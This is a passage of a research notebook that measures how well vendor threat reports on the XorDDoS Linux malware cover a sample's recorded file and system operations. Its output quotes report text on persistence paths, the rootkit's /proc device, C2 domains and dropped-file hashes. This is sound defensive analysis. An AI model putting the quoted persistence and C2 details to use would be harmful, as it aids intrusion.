    "def get_mem_usage() -> int:\n",
    "    # process = psutil.Process(os.getpid())\n",
    "    mem_usage = psutil.Process(os.getpid()).memory_info().rss / 1024 ** 2\n",
    "    return mem_usage\n",
    "\n",
    "def run_family_set_procedure(sample: Sample) -> FamilySet:\n",
    "    # family, regexMaster is global variable\n",
    "    fset = FamilySet(family, regexMaster, sample=sample)\n",
    "    for i,rdf in enumerate(xor_report_dfs):\n",
    "        # rem = ReportEvalModel(base_data, rdf, dofloo_report_names[i])\n",
    "        fset.add_rem(rdf, xor_report_names[i])\n",
    "    # result_tbl = fset.show_result(apply_weight=False)\n",
    "    # result_tbl.to_csv(f'{outputfolder}/{family}_{sample.samplename[:3]}_FamilySet_by_Regex.csv', index=False)\n",
    "    # print(f\"Sample {sample.samplename[:3]} has ttl_match {result_tbl['ttl_match'].sum()} on all documents.\") \n",
    "\n",
    "    # Calculate metrics\n",
    "    print_mem_usage()\n",
    "    print(f\"asg_object: {set([op.object for op in sample.OPset])}\\n\")\n",
    "    fset.sample.OPset_sysOnly_ordered = [op for op in sample.OPset if op.object.find('/etc') != -1]\n",
    "    fset.sample.OPset_sysOnly_ordered_index = [sample.OPset_ordered.index(op) for op in fset.sample.OPset_sysOnly_ordered]\n",
    "    for idx_rem, rem in enumerate(fset.rem_lst):\n",
    "        # asg_object = set([op.object for op in sample.OPset])\n",
    "        # ctd_object = set([op.object for op in rem.doc_OPset])\n",
    "        if rem.reportname == 'Xorddos-Microsoft.csv': # 除錯用\n",
    "            continue\n",
    "        print(f\"\\nSample {rem.reportname}\")\n",
    "        print(f\"\\tnum of segment in report: {len(rem.sentences)}\")\n",
    "        print(f\"\\tlenght of ctd's OPset is {len(rem.doc_OPset)}\")\n",
    "\n",
    "        # R_malObj 比較物件\n",
    "        asg_object = set([op.object for op in sample.OPset])\n",
    "        ctd_object = set([op.object for op in rem.doc_OPset])\n",
    "        ctd_object = ctd_object.intersection(asg_object)\n",
    "        numerator = len(ctd_object) # 分子\n",
    "        denominator = len(asg_object) # 分母\n",
    "        R_malObj = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malObj\\n\\tnum of ctd objects: {numerator}, num of asg objects: {denominator}. R_malObj is {R_malObj:.4f}\")\n",
    "        print(f\"\\t\\tctd_object: {ctd_object}\")\n",
    "\n",
    "        # R_malSysObj 比較系統物件\n",
    "        asg_sysobj = list(filter(lambda object: object.find('/etc') != -1, asg_object))\n",
    "        ctd_sysobj = list(filter(lambda object: object.find('/etc') != -1, ctd_object))\n",
    "        numerator = len(ctd_sysobj)\n",
    "        denominator = len(asg_sysobj)\n",
    "        R_malSysObj = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malSysObj\\n\\tnum of ctd objects: {numerator}, num of asg objects: {denominator}. R_malSysObj is {R_malSysObj:.4f}\")\n",
    "\n",
    "        # R_malOps 比較動作和物件\n",
    "        asg_OPset = list(sample.OPset)\n",
    "        ctd_OPset = list(rem.doc_OPset)\n",
    "        operationEvaluator = OperationEvaluator()\n",
    "        numerator, denominator, hits = 0, len(asg_OPset), []\n",
    "        hits: list[tuple[OperationPair, OperationPair]] = []\n",
    "        sys_hits: list[tuple[OperationPair, OperationPair]] = []\n",
    "        print(f\"\\t\\tlen(asg_OPset): {len(asg_OPset)}, len(ctd_OPset): {len(ctd_OPset)}\")\n",
    "        # 每一個 asg_op 跟所有同物件的的 ctd_op 進行 resolve() 比對，來判斷此 asg_op 是否被提及\n",
    "        i = 0\n",
    "        for idx_asg, asg_op in enumerate(asg_OPset): \n",
    "            i += 1\n",
    "            # print(f\"\\tno.{i} asg_op {asg_op}\") # 瓶頸卡在 no.51 step (total 71 step)\n",
    "            target_obj = asg_op.object\n",
    "            ctdSameObjOpsIdx = [i for i, x in enumerate(ctd_OPset) if x.object == target_obj]\n",
    "            # if i==51:\n",
    "            # print(f\"\\tno.{i} | asg_op {asg_op}, len of ctdSameObjOpsIdx: {ctdSameObjOpsIdx}\")\n",
    "            # ctdSameObjOps = [x for x in ctd_OPset if x.object == target_obj]\n",
    "            for idx in ctdSameObjOpsIdx:\n",
    "                pass\n",
    "                # mem_before_create_lst = get_mem_usage()\n",
    "                # print(\"\\tbefore resolve\", mem_before_create_lst)\n",
    "                hit = operationEvaluator.resolve(asg_op.action, ctd_OPset[idx].action)\n",
    "                # # print_mem_usage()\n",
    "                # mem_after_create_lst = get_mem_usage()\n",
    "                # # print(f\"\\t=== diff of mem_usage calling resolve(): {mem_after_create_lst - mem_before_create_lst:.2f}  ===\")\n",
    "        \n",
    "                if hit:\n",
    "                    numerator += 1\n",
    "                    (opModeAsg, opModeCtd) = hit # hit is [OperationMode]*2\n",
    "                    hits.append((asg_OPset[idx_asg], ctd_OPset[idx]))\n",
    "                    fset.rem_lst[idx_rem].match_doc_OPset.add(ctd_OPset[idx])\n",
    "\n",
    "                    # 篩選出系統物件的動作\n",
    "                    if (opModeAsg in [OperationMode.FILE_UPDATE]) and asg_OPset[idx_asg].object.find('/etc') != -1:\n",
    "                        sys_hits.append((asg_OPset[idx_asg], ctd_OPset[idx]))\n",
    "\n",
    "                    # 紀錄CTD的生命週期 (ASG_OP提及順序)\n",
    "                    step_num = sample.OPset_ordered.index(asg_op) # index of step, throw ValueError if not found\n",
    "                    fset.rem_lst[idx_rem].OPset_order_index.append(step_num)\n",
    "                    break\n",
    "        R_malOps = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malOps\\n\\tnum of matched asg op: {numerator}, num of asg op: {denominator}. R_malOps is {R_malOps:.4f}\")\n",
    "        print(f\"\\t\\trefered lifecycle: {fset.rem_lst[idx_rem].OPset_order_index}\")\n",
    "\n",
    "        # 紀錄CTD的生命週期 (OP提及順序)\n",
    "        # fset.rem_lst[idx_rem].OPset_order_index.clear()\n",
    "        # for ctd_op in fset.rem_lst[idx_rem].match_doc_OPset:\n",
    "        #     step_num = sample.OPset_ordered.index(ctd_op) # index of step, throw ValueError if not found\n",
    "        #     fset.rem_lst[idx_rem].OPset_order_index.append(step_num)\n",
    "\n",
    "        # R_malChangeOps 篩選出系統物件的動作\n",
    "        # cando: 加上 OPMode的考量，為class OP加兩個mode asg_op_mode, ctd_op_mode。目前直接用call nlp class 的 method判別。\n",
    "        numerator = len(sys_hits)\n",
    "        sys_asg_OPset = [op for op in asg_OPset if op.object.find('/etc') != -1 \\\n",
    "                         and operationEvaluator.get_mode(op.action) == OperationMode.FILE_UPDATE ]\n",
    "        # print('sys_asg_OPset is unique:', len(sample.OPset_ordered) == len(set(sample.OPset_ordered))) # 元速度重複沒錯，可能是 index() 的問題\n",
    "        print(f\"\\t\\tsys_asg_OPset: {sys_asg_OPset}\")\n",
    "        denominator = len(sys_asg_OPset)\n",
    "        R_malChangeOps = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malChangeOps\\n\\tnum of matched asg op: {numerator}, num of asg op: {denominator}. R_malChangeOps is {R_malChangeOps:.4f}\")\n",
    "\n",
    "        # 紀錄CTD的生命週期 (OP提及順序)\n",
    "        fset.rem_lst[idx_rem].SysOPset_order_index.clear()\n",
    "        for asg_op , ctd_op in sys_hits:\n",
    "            step_num = sample.OPset_ordered.index(asg_op) # step index , throw ValueError if not found\n",
    "            fset.rem_lst[idx_rem].SysOPset_order_index.append(step_num)\n",
    "        print(f\"\\t\\tref-sys lifecycle: {fset.rem_lst[idx_rem].SysOPset_order_index}\")\n",
    "\n",
    "        if hits:\n",
    "            print(\"\\n\\thits\")\n",
    "            for asg_op, ctd_op in hits:\n",
    "                print(f\"\\t{asg_op}, {ctd_op.getSentStr()}\")\n",
    "        if sys_hits:\n",
    "            print(\"\\n\\tsys_hits\")\n",
    "            for asg_op, ctd_op in sys_hits:\n",
    "                print(f\"\\t{asg_op}, {ctd_op.getSentStr()}\")\n",
    "\n",
    "        # print_mem_usage()\n",
    "        # del asg_OPset, ctd_OPset, hits, sys_hits\n",
    "    print(\"\\n\\nOperationPair that changes system resources:\\n\", sys_asg_OPset)\n",
    "\n",
    "    return fset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "def save_match_sent_to_excel(fset: FamilySet, sample_name=None):\n",
    "    columns = ['report','regex','matched word','sentence number','sentence']\n",
    "    if sample_name:\n",
    "        output_xlsx = f'{outputfolder}/{family}_{sample_name[:3]}_report_match_sent.csv'\n",
    "    else:\n",
    "        output_xlsx = f'{outputfolder}/{family}_union_report_match_sent.csv'\n",
    "    has_match = sum([len(rem.get_match_regexs()) for rem in fset.rem_lst])\n",
    "    if has_match == 0:\n",
    "        print('no matches in CTI reports') # with open 一定要寫入，若全空則直接不開檔\n",
    "        return\n",
    "    # with pd.ExcelWriter(output_xlsx, engine='openpyxl') as writer:\n",
    "    \n",
    "    # 遍歷報告，一個 rem: ReportEvalModel 代表一篇報告\n",
    "    csv_data = []\n",
    "    match_sentence_ttlcnt = 0\n",
    "    for rem in fset.rem_lst:\n",
    "        reportname = rem.reportname.split('.')[0]\n",
    "        if len(rem.get_match_regexs()) == 0: # 如果報告中無 regex 跳過不紀錄\n",
    "            continue\n",
    "        # sheet_data = [] # shape = columns_len * match_sent_len\n",
    "        sent_df = rem.get_match_sentences()\n",
    "        sent_content_lst = rem.sentences['Content'] # 報告中的每個句子\n",
    "        match_sentence_ttlcnt += sent_df['match'].sum()\n",
    "\n",
    "        # 遍歷每個含有 regex 的句子\n",
    "        for sid, row in sent_df.iterrows():\n",
    "            if row['match'] == 0:\n",
    "                continue\n",
    "            row.drop('match', inplace=True)\n",
    "            row = row[row > 0]\n",
    "            # print(row)\n",
    "            # 考量每個句子可能含有多個 regex，故需寫成多行\n",
    "            for i, v in row.items():\n",
    "                insert_data = dict().fromkeys(columns)\n",
    "                insert_data['report'] = reportname\n",
    "                insert_data['regex'] = i\n",
    "                insert_data['matched word'] = rem.get_match_word(sid, i)\n",
    "                insert_data['sentence number'] = sid + 1\n",
    "                insert_data['sentence'] = str(sent_content_lst[sid]).strip()\n",
    "                # sheet_data.append(insert_data)\n",
    "                csv_data.append(insert_data)\n",
    "    df = pd.DataFrame(csv_data)\n",
    "    # print(df)\n",
    "    df.to_csv(output_xlsx, index=False)\n",
    "\n",
    "            # 輸出 csv\n",
    "            \n",
    "            # 輸出 excel sheet\n",
    "            # print(rem.reportname,'has', len(sheet_data),'matches')\n",
    "            # output_sheet = pd.DataFrame(sheet_data)\n",
    "            # # output_sheet.style.set_properties(subset=['sentence'])\n",
    "            # styler = Styler(horizontal_alignment='left', vertical_alignment='top')\n",
    "            # sf = StyleFrame(output_sheet, styler)\n",
    "            # sf = sf.set_column_width(columns=['baseline'], width=20.0)\n",
    "            # sf = sf.set_column_width(columns=['sentence number'], width=15.0)\n",
    "            # sf = sf.set_column_width(columns=['sentence'], width=80.0)\n",
    "            # sf.to_excel(writer, sheet_name=rem.reportname, index=False) #.save()\n",
    "            # # output_sheet.to_excel(writer, sheet_name=rem.reportname, index=False)\n",
    "    return match_sentence_ttlcnt\n",
    "\n",
    "# 此行會執行並複寫 excel，執行完後要手動調整行距格式，小心使用\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "=== mem_usage: 211.67 MB ===\n",
      "asg_object: {'bin/sed', '[a-zA-z]:\\\\d{1,5}$', '/perl/', '/var/run/', '^pipe(\\\\$|\\\\.|$)', 'bin/insserv', '/etc/init.d/', '^chkconfig$', '/boot/', '/proc/rs_dev', '/etc/cron', '/boot/[a-z]{10}', '/var/', '/proc/', '^sh$', '/etc/rc', 'update-rc.d', '\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}', '/etc/sed', '\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}:\\\\d{1,5}$', '/run/', '/selinux', 'permission(\\\\s|:)[0-9]{1,4}', '^sed$', 'bin/openrc', '^systemctl$'}\n",
      "\n",
      "\n",
      "Sample Xorddos-Cdnetworks.csv\n",
      "\tnum of segment in report: 32\n",
      "\tlenght of ctd's OPset is 0\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 26. R_malObj is 0.0000\n",
      "\t\tctd_object: set()\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 0\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 0, num of asg op: 73. R_malOps is 0.0000\n",
      "\t\trefered lifecycle: []\n",
      "\t\tsys_asg_OPset: [<OP46 act=fchown, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>, <OP22 act=write, obj=/etc/rc>, <OP18 act=write, obj=/etc/cron>, <OP47 act=fchmod, obj=/etc/sed>, <OP15 act=write, obj=/etc/init.d/>, <OP45 act=write, obj=/etc/sed>, <OP32 act=lstat, obj=/etc/rc>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "Sample Xorddos-Crowdstrike.csv\n",
      "\tnum of segment in report: 45\n",
      "\tlenght of ctd's OPset is 0\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 26. R_malObj is 0.0000\n",
      "\t\tctd_object: set()\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 0\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 0, num of asg op: 73. R_malOps is 0.0000\n",
      "\t\trefered lifecycle: []\n",
      "\t\tsys_asg_OPset: [<OP46 act=fchown, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>, <OP22 act=write, obj=/etc/rc>, <OP18 act=write, obj=/etc/cron>, <OP47 act=fchmod, obj=/etc/sed>, <OP15 act=write, obj=/etc/init.d/>, <OP45 act=write, obj=/etc/sed>, <OP32 act=lstat, obj=/etc/rc>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "Sample Xorddos-Intezer.csv\n",
      "\tnum of segment in report: 156\n",
      "\tlenght of ctd's OPset is 7\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 4, num of asg objects: 26. R_malObj is 0.1538\n",
      "\t\tctd_object: {'/etc/rc', '\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}', '/etc/init.d/', '/proc/'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 2, num of asg objects: 4. R_malSysObj is 0.5000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 7\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 3, num of asg op: 73. R_malOps is 0.0411\n",
      "\t\trefered lifecycle: [68, 0, 67]\n",
      "\t\tsys_asg_OPset: [<OP46 act=fchown, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>, <OP22 act=write, obj=/etc/rc>, <OP18 act=write, obj=/etc/cron>, <OP47 act=fchmod, obj=/etc/sed>, <OP15 act=write, obj=/etc/init.d/>, <OP45 act=write, obj=/etc/sed>, <OP32 act=lstat, obj=/etc/rc>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP69 act=newfstatat, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key\tdescription\tcomment hostip\tip\thardcoded to 127.0.0.1 softtype\t\thardcoded to “linux” pscaddr\tmac address\t hostname\tmachine name\t hosttar\tusername\tpossibly “host target” hostos\tdistribution\textracted from /etc/issue or /etc/redhat-release hostcpu\tclock speed\t/proc/cpuinfo hostmem\tamount of memory\t/proc/meminfo hostpack\t\thardcoded to “linux” lkmtag\tis rootkit enabled\t kernel\tkernel version\textracted from unamefigure 12 shows the communication between redxor and the c2.>\n",
      "\t<OP 1 act=readlink, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key\tdescription\tcomment hostip\tip\thardcoded to 127.0.0.1 softtype\t\thardcoded to “linux” pscaddr\tmac address\t hostname\tmachine name\t hosttar\tusername\tpossibly “host target” hostos\tdistribution\textracted from /etc/issue or /etc/redhat-release hostcpu\tclock speed\t/proc/cpuinfo hostmem\tamount of memory\t/proc/meminfo hostpack\t\thardcoded to “linux” lkmtag\tis rootkit enabled\t kernel\tkernel version\textracted from unamefigure 12 shows the communication between redxor and the c2.>\n",
      "\t<OP68 act=access, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key\tdescription\tcomment hostip\tip\thardcoded to 127.0.0.1 softtype\t\thardcoded to “linux” pscaddr\tmac address\t hostname\tmachine name\t hosttar\tusername\tpossibly “host target” hostos\tdistribution\textracted from /etc/issue or /etc/redhat-release hostcpu\tclock speed\t/proc/cpuinfo hostmem\tamount of memory\t/proc/meminfo hostpack\t\thardcoded to “linux” lkmtag\tis rootkit enabled\t kernel\tkernel version\textracted from unamefigure 12 shows the communication between redxor and the c2.>\n",
      "\n",
      "Sample Xorddos-Ms.csv\n",
      "\tnum of segment in report: 252\n",
      "\tlenght of ctd's OPset is 51\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 12, num of asg objects: 26. R_malObj is 0.4615\n",
      "\t\tctd_object: {'/var/run/', '/var/', 'update-rc.d', '/etc/init.d/', '/proc/', '/run/', '[a-zA-z]:\\\\d{1,5}$', '^chkconfig$', '^sh$', '/etc/rc', '/proc/rs_dev', '/etc/cron'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 3, num of asg objects: 4. R_malSysObj is 0.7500\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 51\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 18, num of asg op: 73. R_malOps is 0.2466\n",
      "\t\trefered lifecycle: [68, 0, 52, 40, 56, 15, 69, 49, 32, 12, 55, 67, 51, 48, 26, 57, 50, 2]\n",
      "\t\tsys_asg_OPset: [<OP46 act=fchown, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>, <OP22 act=write, obj=/etc/rc>, <OP18 act=write, obj=/etc/cron>, <OP47 act=fchmod, obj=/etc/sed>, <OP15 act=write, obj=/etc/init.d/>, <OP45 act=write, obj=/etc/sed>, <OP32 act=lstat, obj=/etc/rc>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP69 act=newfstatat, obj=/proc/>, <OP36 act=use, obj=/proc/rs_dev, sent= xorddos uses /proc/rs_dev character device to communicate with the rootkit.>\n",
      "\t<OP 1 act=readlink, obj=/proc/>, <OP36 act=use, obj=/proc/rs_dev, sent= xorddos uses /proc/rs_dev character device to communicate with the rootkit.>\n",
      "\t<OP53 act=open, obj=/var/>, <OP30 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>\n",
      "\t<OP41 act=umask, obj=[a-zA-z]:\\d{1,5}$>, <OP38 act=fetch, obj=www.enoan2107.com:3306, sent=after decoding the urls, it adds them into a remote list, which is later used to communicate and fetch commands from the command and control (c2) server: www.enoan2107.com:3306 www.gzcfr5axf6.com:3306 malicious activity threads after creating persistent entries, deleting evidence of its activities, and decoding config.rar, the malware initializes a cyclic redundancy check (crc) table followed by an unnamed semaphore using the sem_init api.>\n",
      "\t<OP57 act=lseek, obj=/var/run/>, <OP42 act=read, obj=/var/run/gcc.pid, sent=it performs the following tasks:  reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the c2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string.>\n",
      "\t<OP16 act=open, obj=/etc/cron>, <OP49 act=drop, obj=/etc/cron.hourly/gcc.sh, sent= dropped files dropped file path\tfile type\tsha-256 /etc/init.d/hflggwyfsc.elf\tshell script\t6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf /etc/cron.hourly/gcc.sh\tshell script\tcbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459 /lib/libudev.so\telf\tf2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432 /run/gcc.pid\ttext\t932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a /usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/dmpyuitfoq\telf\t798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c /usr/bin/fdinprytpq\telf\t2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3 /usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kagbjahdic\telf\te6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b /usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/kndmhuqmah\telf\tb5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a /usr/bin/qkxqoelrfa\telf\td71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7 /usr/bin/sykhrxsazz\telf\t9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489 /usr/bin/tcnszvmpqn\telf\t360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd /usr/bin/zalkpggsgh\telf\tdc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7 /usr/bin/zvcarxfquk\telf\t175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4 /tmp/bin/3200\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea installer script\tbash script\t8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2 /usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/zvcarxfqul\telf (rootkit)\t483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25 /usr/bin/zvzvmpqnv\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea>\n",
      "\t<OP70 act=newfstatat, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP50 act=stat64, obj=/var/run/>, <OP42 act=read, obj=/var/run/gcc.pid, sent=it performs the following tasks:  reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the c2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string.>\n",
      "\t<OP33 act=stat, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP13 act=open, obj=/etc/init.d/>, <OP20 act=drop, obj=/etc/init.d/hflggwyfsc.elf, sent=figure 11. content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf>\n",
      "\t<OP56 act=lseek, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP68 act=access, obj=/proc/>, <OP36 act=use, obj=/proc/rs_dev, sent= xorddos uses /proc/rs_dev character device to communicate with the rootkit.>\n",
      "\t<OP52 act=open, obj=/var/run/>, <OP29 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>\n",
      "\t<OP49 act=stat64, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP27 act=clone, obj=^chkconfig$>, <OP33 act=perform, obj=chkconfig, sent=additionally, it performs the following tasks on a provided $pid:  fetches the process file name corresponding to the provided $pid deletes the file for the provided $pid deletes the installed init services: deletes /etc/init.d/<file_name> for runlevels 1-5, unlinks and deletes /etc/rc<runlevel>.d/s90<file_name> performs the command chkconfig –del <file_name> performs the command update-rc.d <file_name> remove ends the process that was provided as an argument.>\n",
      "\t<OP58 act=lseek, obj=/var/>, <OP43 act=read, obj=/var/run/gcc.pid, sent=it performs the following tasks:  reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the c2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string.>\n",
      "\t<OP51 act=open, obj=/run/>, <OP31 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>\n",
      "\t<OP 3 act=stat64, obj=/var/>, <OP43 act=read, obj=/var/run/gcc.pid, sent=it performs the following tasks:  reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the c2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string.>\n",
      "\n",
      "Sample Xorddos-Trendmicro.csv\n",
      "\tnum of segment in report: 27\n",
      "\tlenght of ctd's OPset is 6\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 6, num of asg objects: 26. R_malObj is 0.2308\n",
      "\t\tctd_object: {'/var/run/', '/var/', '/run/', '[a-zA-z]:\\\\d{1,5}$', '/etc/rc', '/etc/cron'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 2, num of asg objects: 4. R_malSysObj is 0.5000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 6\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 9, num of asg op: 73. R_malOps is 0.1233\n",
      "\t\trefered lifecycle: [56, 15, 69, 49, 32, 55, 48, 57, 2]\n",
      "\t\tsys_asg_OPset: [<OP46 act=fchown, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>, <OP22 act=write, obj=/etc/rc>, <OP18 act=write, obj=/etc/cron>, <OP47 act=fchmod, obj=/etc/sed>, <OP15 act=write, obj=/etc/init.d/>, <OP45 act=write, obj=/etc/sed>, <OP32 act=lstat, obj=/etc/rc>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP57 act=lseek, obj=/var/run/>, <OP 4 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
